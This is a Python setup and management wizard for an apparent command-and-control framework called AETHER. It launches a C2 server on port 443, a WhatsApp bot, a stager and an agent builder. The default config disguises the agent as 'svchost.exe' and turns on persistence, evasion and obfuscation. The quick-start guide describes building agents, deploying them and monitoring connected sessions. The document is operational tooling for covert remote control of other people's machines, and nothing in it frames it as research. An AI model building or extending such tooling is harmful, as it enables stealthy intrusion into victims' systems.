#!/usr/bin/env python3
"""
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ - AETHER C2 Framework
║ ║ ║ ║ ║╠═╝║  ║╣ ╠╦╝   Interactive Setup & Component Management
╚═╝╩   ╩ ║ ║ ╩═╝╚═╝╩╚═

Complete setup wizard and component launcher for AETHER C2 Framework
"""

import os
import sys
import json
import subprocess
import platform
from pathlib import Path

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header(text):
    """Print a formatted header"""
    print(f"\n{Colors.BOLD}{Colors.OKBLUE}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKBLUE}{text.center(80)}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKBLUE}{'='*80}{Colors.ENDC}\n")

def print_success(text):
    """Print success message"""
    print(f"{Colors.OKGREEN}✅ {text}{Colors.ENDC}")

def print_error(text):
    """Print error message"""
    print(f"{Colors.FAIL}❌ {text}{Colors.ENDC}")

def print_warning(text):
    """Print warning message"""
    print(f"{Colors.WARNING}⚠️ {text}{Colors.ENDC}")

def print_info(text):
    """Print info message"""
    print(f"{Colors.OKCYAN}ℹ️ {text}{Colors.ENDC}")

def load_config():
    """Load config.json and ensure all sections exist"""
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except FileNotFoundError:
        config = {}
    except json.JSONDecodeError:
        config = {}
    
    # Ensure all required sections exist
    defaults = {
        'c2': {
            'host': '0.0.0.0',
            'port': 443,
            'encryption_key': '',
            'beacon_interval': 30
        },
        'agent': {
            'process_name': 'svchost.exe',
            'persistence': True,
            'evasion': True
        },
        'builder': {
            'obfuscation': True,
            'icon_path': ''
        },
        'stager': {
            'type': 'exe'
        },
        'whatsapp': {
            'enabled': False,
            'api_key': ''
        }
    }
    
    for section, values in defaults.items():
        if section not in config:
            config[section] = values
        else:
            # Merge with defaults for missing keys
            for key, value in values.items():
                if key not in config[section]:
                    config[section][key] = value
    
    return config

def save_config(config):
    """Save config.json"""
    try:
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=2)
        print_success("Configuration saved to config.json")
        return True
    except Exception as e:
        print_error(f"Failed to save config: {str(e)}")
        return False

def find_python():
    """Find Python executable path"""
    python_names = ['python3', 'python', 'python.exe']
    
    for py_name in python_names:
        try:
            result = subprocess.run(
                [py_name, '--version'],
                capture_output=True,
                timeout=2
            )
            if result.returncode == 0:
                return py_name
        except:
            continue
    
    return None

def check_dependencies():
    """Check if all dependencies are installed"""
    print("\n" + "="*80)
    print("DEPENDENCY STATUS".center(80))
    print("="*80 + "\n")
    
    all_good = True
    
    # Check Python
    python = find_python()
    if python:
        try:
            result = subprocess.run(
                [python, '--version'],
                capture_output=True,
                text=True
            )
            print_success(f"Python: {result.stdout.strip()}")
        except:
            print_error("Python: Not found")
            all_good = False
    else:
        print_error("Python: Not found")
        all_good = False
    
    # Check Python packages
    print_info("\nChecking critical Python packages...")
    critical_packages = ['requests', 'flask', 'pino']
    
    for package in critical_packages:
        try:
            result = subprocess.run(
                ['pip', 'show', package],
                capture_output=True,
                timeout=5
            )
            if result.returncode == 0:
                version_line = [l for l in result.stdout.decode().split('\n') if l.startswith('Version:')]
                version = version_line[0].split(':')[1].strip() if version_line else 'unknown'
                print_success(f"  {package}: {version}")
            else:
                print_warning(f"  {package}: Not installed")
        except:
            print_warning(f"  {package}: Unable to check")
    
    # Check Node.js
    print_info("\nChecking Node.js...")
    try:
        result = subprocess.run(
            ['node', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            print_success(f"Node.js: {result.stdout.strip()}")
        else:
            print_warning("Node.js: Not found (optional, only needed for WhatsApp bot)")
    except:
        print_warning("Node.js: Not found (optional, only needed for WhatsApp bot)")
    
    # Check npm
    try:
        result = subprocess.run(
            ['npm', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            print_success(f"npm: {result.stdout.strip()}")
        else:
            print_warning("npm: Not found (optional)")
    except:
        print_warning("npm: Not found (optional)")
    
    # Check Node modules
    print_info("\nChecking Node.js dependencies...")
    if os.path.exists('WA-BOT-Base/node_modules'):
        count = len([d for d in os.listdir('WA-BOT-Base/node_modules') if os.path.isdir(os.path.join('WA-BOT-Base/node_modules', d))])
        print_success(f"Node modules: {count} packages installed")
    else:
        print_warning("Node modules: Not installed")
        print_info("  Run: cd WA-BOT-Base && npm install")
    
    # Check Python requirements
    print_info("\nChecking requirements.txt...")
    if os.path.exists('requirements.txt'):
        with open('requirements.txt', 'r') as f:
            reqs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        print_success(f"requirements.txt: {len(reqs)} dependencies listed")
    else:
        print_warning("requirements.txt: Not found")
    
    print("\n" + "="*80)
    if all_good:
        print_success("All critical dependencies installed!".center(80))
    else:
        print_warning("Some dependencies need attention - see above".center(80))
    print("="*80 + "\n")
    
    return all_good

def run_component_menu():
    """Menu to run different components"""
    while True:
        clear_screen()
        print_header("▶ Run Components")
        
        print("▶️  Available Components:\n")
        print("[1] Start AETHER C2 Server")
        print("[2] Start WhatsApp Bot (Baileys)")
        print("[3] Build Agent")
        print("[4] Run Integration Tests")
        print("[5] Start All Components (Interactive)")
        print("[6] Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Select option: {Colors.ENDC}").strip()
        
        if choice == "1":
            start_c2_server()
        elif choice == "2":
            start_whatsapp_bot()
        elif choice == "3":
            build_agent()
        elif choice == "4":
            run_tests()
        elif choice == "5":
            start_all_components()
        elif choice == "6":
            break
        else:
            print_error("Invalid option")
            input("Press Enter to continue...")

def start_c2_server():
    """Start AETHER C2 Server"""
    clear_screen()
    print_header("Starting AETHER C2 Server")
    
    python = find_python()
    if not python:
        print_error("Python not found. Please install Python 3.8+")
        input("Press Enter to continue...")
        return
    
    config = load_config()
    host = config.get('c2', {}).get('host', '0.0.0.0')
    port = config.get('c2', {}).get('port', 443)
    
    print_info(f"Starting C2 Server on {host}:{port}")
    print_info("Press Ctrl+C to stop\n")
    
    cmd = [python, 'server/aether_server.py', '--host', host, '--port', str(port)]
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print_warning("\nC2 Server stopped")
    except Exception as e:
        print_error(f"Failed to start C2 Server: {str(e)}")
    
    input("\nPress Enter to continue...")

def start_whatsapp_bot():
    """Start WhatsApp Bot"""
    clear_screen()
    print_header("Starting WhatsApp Bot (Baileys)")
    
    if not os.path.exists('WA-BOT-Base'):
        print_error("WA-BOT-Base directory not found")
        input("Press Enter to continue...")
        return
    
    if not os.path.exists('WA-BOT-Base/node_modules'):
        print_warning("Node modules not installed")
        print_info("Installing dependencies...")
        
        try:
            result = subprocess.run(
                ['npm', 'install'],
                cwd='WA-BOT-Base',
                capture_output=False
            )
            if result.returncode != 0:
                print_error("Failed to install dependencies")
                input("Press Enter to continue...")
                return
        except FileNotFoundError:
            print_error("npm not found. Please install Node.js")
            input("Press Enter to continue...")
            return
    
    print_info("Starting bot with: npm start")
    print_info("Press Ctrl+C to stop\n")
    
    try:
        subprocess.run(['npm', 'start'], cwd='WA-BOT-Base')
    except KeyboardInterrupt:
        print_warning("\nBot stopped")
    except Exception as e:
        print_error(f"Failed to start bot: {str(e)}")
    
    input("\nPress Enter to continue...")

def build_agent():
    """Build the agent"""
    clear_screen()
    print_header("Building AETHER Agent")
    
    python = find_python()
    if not python:
        print_error("Python not found")
        input("Press Enter to continue...")
        return
    
    print_info("Building agent with: python builder/compile.py")
    print_info("Press Ctrl+C to stop\n")
    
    cmd = [python, 'builder/compile.py']
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print_warning("\nBuild cancelled")
    except Exception as e:
        print_error(f"Failed to build agent: {str(e)}")
    
    input("\nPress Enter to continue...")

def run_tests():
    """Run integration tests"""
    clear_screen()
    print_header("Running Integration Tests")
    
    python = find_python()
    if not python:
        print_error("Python not found")
        input("Press Enter to continue...")
        return
    
    if not os.path.exists('test_integration.py'):
        print_error("test_integration.py not found")
        input("Press Enter to continue...")
        return
    
    print_info("Running tests...\n")
    
    cmd = [python, 'test_integration.py']
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print_error(f"Failed to run tests: {str(e)}")
    
    input("\nPress Enter to continue...")

def start_all_components():
    """Interactive multi-component startup"""
    clear_screen()
    print_header("Start All Components")
    
    print("This will start multiple components in sequence.\n")
    print("Choose what to start:\n")
    print("[1] C2 Server only")
    print("[2] Bot only")
    print("[3] C2 Server + Bot (in separate processes)")
    print("[4] Back")
    
    choice = input(f"\n{Colors.BOLD}Select option: {Colors.ENDC}").strip()
    
    if choice == "1":
        start_c2_server()
    elif choice == "2":
        start_whatsapp_bot()
    elif choice == "3":
        print_info("Note: This will run them sequentially. Use separate terminals for parallel.")
        print_info("Starting C2 Server...")
        start_c2_server()
        print_info("\nNow start bot in another terminal with option [2]")
    elif choice == "4":
        return
    else:
        print_error("Invalid option")
    
    input("\nPress Enter to continue...")

def show_system_status():
    """Show system status and diagnostics"""
    clear_screen()
    print_header("System Status & Diagnostics")
    
    print("\n" + "="*80)
    print("AETHER C2 SYSTEM STATUS".center(80))
    print("="*80 + "\n")
    
    # Python status
    python = find_python()
    if python:
        try:
            result = subprocess.run([python, '--version'], capture_output=True, text=True)
            print_success(f"Python: {result.stdout.strip()}")
        except:
            print_error("Python: Not accessible")
    else:
        print_error("Python: Not found")
    
    # Node.js status
    try:
        result = subprocess.run(['node', '--version'], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
            print_success(f"Node.js: {result.stdout.strip()}")
        else:
            print_warning("Node.js: Not found")
    except:
        print_warning("Node.js: Not found (optional)")
    
    # npm status
    try:
        result = subprocess.run(['npm', '--version'], capture_output=True, text=True, timeout=2)
        if result.returncode == 0:
            print_success(f"npm: {result.stdout.strip()}")
        else:
            print_warning("npm: Not found")
    except:
        print_warning("npm: Not found")
    
    # Configuration status
    print("\n" + "-"*80)
    config = load_config()
    print_info("Configuration Status:")
    
    sections = ['c2', 'agent', 'builder', 'stager', 'whatsapp']
    for section in sections:
        if section in config:
            print_success(f"  {section}: Configured")
        else:
            print_warning(f"  {section}: Not configured")
    
    # Files status
    print("\n" + "-"*80)
    print_info("Project Files:")
    
    required_files = [
        ('server/aether_server.py', 'C2 Server'),
        ('agent/aether_agent.py', 'Agent'),
        ('builder/compile.py', 'Agent Builder'),
        ('stager/stager.py', 'Stager'),
        ('WA-BOT-Base/main.js', 'WhatsApp Bot'),
        ('WA-BOT-Base/index.js', 'Bot Launcher'),
    ]
    
    for file_path, name in required_files:
        if os.path.exists(file_path):
            size = os.path.getsize(file_path)
            print_success(f"  {name}: {file_path} ({size} bytes)")
        else:
            print_error(f"  {name}: {file_path} (missing)")
    
    # Dependencies status
    print("\n" + "-"*80)
    print_info("Dependencies:")
    
    if os.path.exists('requirements.txt'):
        with open('requirements.txt', 'r') as f:
            reqs = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        print_success(f"  Python: {len(reqs)} packages in requirements.txt")
    else:
        print_warning("  Python: requirements.txt not found")
    
    if os.path.exists('WA-BOT-Base/node_modules'):
        count = len([d for d in os.listdir('WA-BOT-Base/node_modules') if os.path.isdir(os.path.join('WA-BOT-Base/node_modules', d))])
        print_success(f"  Node.js: {count} packages installed")
    else:
        print_warning("  Node.js: node_modules not installed")
    
    print("\n" + "="*80 + "\n")
    input("Press Enter to continue...")

def main_menu():
    """Main menu"""
    # Auto-repair config on startup
    config = load_config()
    save_config(config)
    
    while True:
        clear_screen()
        print_header("AETHER C2 Framework - Setup & Management")
        
        config = load_config()
        
        print("\n🔧 Main Menu:\n")
        print("[1] Configure C2 Server")
        print("[2] Configure Agent")
        print("[3] Configure Builder")
        print("[4] Configure WhatsApp Bot")
        print("[5] Install Dependencies")
        print("[6] Check Dependencies")
        print("[7] Run Components")
        print("[8] View Full Configuration Guide")
        print("[9] Quick Start Guide")
        print("[*] System Status")
        print("[0] Exit")
        
        choice = input(f"\n{Colors.BOLD}Select option: {Colors.ENDC}").strip()
        
        if choice == "1":
            configure_c2()
        elif choice == "2":
            configure_agent()
        elif choice == "3":
            configure_builder()
        elif choice == "4":
            configure_whatsapp()
        elif choice == "5":
            install_dependencies()
        elif choice == "6":
            clear_screen()
            print_header("Checking Dependencies")
            check_dependencies()
            input("\nPress Enter to continue...")
        elif choice == "7":
            run_component_menu()
        elif choice == "8":
            show_deployment_guide()
        elif choice == "9":
            show_quick_start()
        elif choice == "*":
            show_system_status()
        elif choice == "0":
            print_success("Goodbye!")
            sys.exit(0)
        else:
            print_error("Invalid option")
            input("Press Enter to continue...")

def configure_c2():
    """Configure C2 Server"""
    clear_screen()
    print_header("Configure C2 Server")
    
    config = load_config()
    if 'c2' not in config:
        config['c2'] = {}
    
    print(f"Current C2 Config: {config['c2']}\n")
    
    host = input(f"C2 Host (default: 0.0.0.0): ").strip() or "0.0.0.0"
    try:
        port = int(input(f"C2 Port (default: 443): ").strip() or "443")
    except ValueError:
        port = 443
    
    config['c2']['host'] = host
    config['c2']['port'] = port
    
    save_config(config)
    input("\nPress Enter to continue...")

def configure_agent():
    """Configure Agent"""
    clear_screen()
    print_header("Configure Agent")
    
    config = load_config()
    if 'agent' not in config:
        config['agent'] = {}
    
    print(f"Current Agent Config: {config['agent']}\n")
    
    name = input("Agent Name (e.g., svchost): ").strip() or "svchost"
    config['agent']['name'] = name
    
    save_config(config)
    input("\nPress Enter to continue...")

def configure_builder():
    """Configure Builder"""
    clear_screen()
    print_header("Configure Builder")
    
    config = load_config()
    if 'builder' not in config:
        config['builder'] = {}
    
    print(f"Current Builder Config: {config['builder']}\n")
    print_info("Builder configuration is typically automatic")
    
    save_config(config)
    input("\nPress Enter to continue...")

def configure_whatsapp():
    """Configure WhatsApp Bot"""
    clear_screen()
    print_header("Configure WhatsApp Bot")
    
    config = load_config()
    if 'whatsapp' not in config:
        config['whatsapp'] = {}
    
    print(f"Current WhatsApp Config: {config['whatsapp']}\n")
    
    api_key = input("WhatsApp API Key (optional): ").strip()
    if api_key:
        config['whatsapp']['api_key'] = api_key
    
    save_config(config)
    input("\nPress Enter to continue...")

def install_dependencies():
    """Install all dependencies"""
    clear_screen()
    print_header("Installing Dependencies")
    
    python = find_python()
    if not python:
        print_error("Python not found. Please install Python 3.8+")
        input("\nPress Enter to continue...")
        return
    
    # Python dependencies
    print_info("Installing Python dependencies from requirements.txt...")
    try:
        result = subprocess.run(
            [python, '-m', 'pip', 'install', '--upgrade', 'pip'],
            capture_output=True
        )
        if result.returncode == 0:
            print_success("pip upgraded successfully")
        
        result = subprocess.run(
            [python, '-m', 'pip', 'install', '-r', 'requirements.txt']
        )
        if result.returncode == 0:
            print_success("✅ Python dependencies installed successfully")
        else:
            print_error("⚠️ Some Python dependencies may have failed")
    except Exception as e:
        print_error(f"Failed to install Python dependencies: {str(e)}")
    
    # Node.js dependencies
    print_info("\nInstalling Node.js dependencies...")
    if os.path.exists('WA-BOT-Base'):
        try:
            result = subprocess.run(
                ['npm', '--version'],
                capture_output=True,
                timeout=5
            )
            if result.returncode == 0:
                npm_version = result.stdout.decode().strip()
                print_success(f"npm {npm_version} found")
                
                result = subprocess.run(
                    ['npm', 'install'],
                    cwd='WA-BOT-Base'
                )
                if result.returncode == 0:
                    print_success("✅ Node.js dependencies installed successfully")
                else:
                    print_error("⚠️ Some Node.js dependencies may have failed")
            else:
                print_error("npm not found. Please install Node.js from https://nodejs.org")
        except FileNotFoundError:
            print_error("npm not found. Please install Node.js from https://nodejs.org")
            print_info("Once installed, you can run 'npm install' manually in WA-BOT-Base/")
        except Exception as e:
            print_error(f"Failed to install Node.js dependencies: {str(e)}")
    else:
        print_warning("WA-BOT-Base directory not found (optional)")
    
    print_success("\n✅ Dependency installation complete!")
    input("\nPress Enter to continue...")

def show_deployment_guide():
    """Show deployment guide"""
    clear_screen()
    print_header("Deployment Guide")
    
    python = find_python()
    if not python:
        print_error("Python not found")
        input("Press Enter to continue...")
        return
    
    try:
        subprocess.run([python, 'DEPLOYMENT_GUIDE.py'])
    except:
        print_error("Failed to display guide")
    
    input("\nPress Enter to continue...")

def show_quick_start():
    """Show quick start guide"""
    clear_screen()
    print_header("Quick Start Guide")
    
    print("""
╔════════════════════════════════════════════════════════════════════════════╗
║                          QUICK START GUIDE                                ║
╚════════════════════════════════════════════════════════════════════════════╝

1️⃣  INSTALL DEPENDENCIES
    python AETHER_SETUP.py → [5] Install Dependencies
    
2️⃣  CONFIGURE SYSTEM
    python AETHER_SETUP.py → [1] Configure C2 Server
    
3️⃣  START C2 SERVER
    python AETHER_SETUP.py → [7] Run Components → [1] Start AETHER C2 Server
    
4️⃣  START BOT (Optional)
    python AETHER_SETUP.py → [7] Run Components → [2] Start WhatsApp Bot
    
5️⃣  BUILD AGENT
    python AETHER_SETUP.py → [7] Run Components → [3] Build Agent
    
6️⃣  DEPLOY & MONITOR
    Use 'sessions' command in C2 Server to see connected agents

═════════════════════════════════════════════════════════════════════════════

🚀 Direct Commands:

Start C2 Server:
    python server/aether_server.py --host 0.0.0.0 --port 443

Start Bot:
    cd WA-BOT-Base && npm start

Build Agent:
    python builder/compile.py

Run Tests:
    python test_integration.py

═════════════════════════════════════════════════════════════════════════════
""")
    
    input("\nPress Enter to continue...")

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        print_warning("\nExiting...")
        sys.exit(0)
    except Exception as e:
        print_error(f"An error occurred: {str(e)}")
        input("Press Enter to continue...")
